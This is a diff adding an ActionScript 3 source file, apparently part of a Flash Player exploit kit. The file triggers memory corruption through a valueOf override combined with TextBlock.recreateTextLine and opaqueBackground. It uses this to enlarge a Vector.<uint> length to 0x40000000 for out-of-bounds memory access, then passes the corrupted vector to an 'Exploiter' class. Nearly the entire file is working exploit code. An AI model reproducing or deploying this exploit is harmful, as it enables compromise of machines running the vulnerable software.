@@ -1,0 +1,145 @@
+package 
+{
+	/**
+	 * ...
+	 * @author dango
+	 */
+	
+	import flash.display.DisplayObjectContainer;
+	import flash.utils.ByteArray;
+	import flash.system.Capabilities;
+	import flash.events.MouseEvent;
+	import flash.external.ExternalInterface;
+	import flash.text.*;
+	import flash.text.engine.*;
+	import Logger;
+	
+	public class MyCase 
+	{
+		static var _gc:Array;
+		static var _mc:MyCase;
+		
+		static var _arLen:int;
+		static var _arLen1:int;
+		static var _arLen2:int;
+		static var _vLen:int;
+		static var _cnt:int;
+		
+		static var i:uint;
+		
+		static var _ar:Array;
+		static var _ar_text_line:Array;
+		static var _ar_reuse:Array;
+		
+		static var _tb:TextBlock;
+		static var _vu:Vector.<uint>;
+		static var MAXLEN:uint = 0x40000000;
+		
+		
+		static function valueOf2():int
+		{
+			try
+			{
+				if (++_cnt < _arLen2)
+				{
+					_ar[_cnt].opaqueBackground = _mc;
+				}
+				else
+				{
+					for (i = 1; i <= 5 ; i++ )
+						_tb.recreateTextLine(_ar[_arLen2 - i]);
+						
+					for (i = _arLen2; i < _arLen; i++ )
+						_ar[i].length = _vLen;
+				}
+			}
+			catch(e:Error)
+			{
+				Logger.log("Valueof2 "+e.toString());
+			}
+			
+			return _vLen + 80;
+		}
+		
+		static function run():void
+		{
+			try
+			{
+				//init vars
+				_arLen1 = 10*3;
+				_arLen2 = _arLen1+4*4;
+				_arLen = _arLen2 + 16;
+			
+				_ar = new Array(_arLen);
+			
+				if (!_gc) _gc = new Array();
+				_gc.push(_ar);
+				
+				if (!_tb){
+					_tb = new TextBlock(new TextElement("TextElement", new ElementFormat() ) );
+					if (!_tb) throw new Error("_tb = " + _tb);
+				}
+			
+				_mc = new MyCase();
+			
+				MyCase.prototype.valueOf = valueOf2;
+			
+				_vLen = 400 / 4 - 2;
+				
+				//Logger.log("Init vars");
+				for (i = 0; i < _arLen1; i++ )
+				{
+					_ar[i] = new Vector.<uint>(_vLen);
+				}
+				
+				for (i = _arLen2; i < _arLen; i++ )
+				{
+					_ar[i] = new Vector.<uint>(8);
+					_ar[i][0] = i;
+					_ar[i][1] = 0xdeadbeef;
+				}
+				//Logger.alert("Init vars finish");
+				for (i = _arLen1; i < _arLen2; i++  )
+					_ar[i] = _tb.createTextLine();
+				for (i = _arLen1; i < _arLen2; i++ )
+					_ar[i].opaqueBackground = 1;
+			
+				_cnt = _arLen2 - 6;
+				_ar[_cnt].opaqueBackground = _mc;
+				
+				for (i = _arLen2; i < _arLen; i++ )
+				{
+					_vu = _ar[i];
+					if (_vu.length > _vLen + 2)
+					{
+						//Logger.alert("ar[" + i.toString() + "].length = " + _vu.length.toString(16));
+						Logger.log("ar[" + i.toString() + "].length = " + _vu.length.toString(16));
+						_vu[98] = MAXLEN;
+						//Logger.alert("ar[" + (i + 1).toString() + "].length = " + _ar[i + 1].length.toString(16));
+						_vu = _ar[i + 1];
+						break;
+					}
+				}
+				if (_vu.length < _vLen +2){
+					throw new Error("try again");
+				}
+				
+				Logger.log("Start to exploit");
+				var exploiter:Exploiter = new Exploiter(_vu, 0x62);
+				
+			}
+			catch (e:Error)
+			{
+				Logger.log("Run Error " + e.toString());
+				if (e.toString().indexOf("try again") != -1){
+					Logger.log("Running again");
+					run();
+				}
+			}
+			
+			
+		}
+		
+	}
+
+}
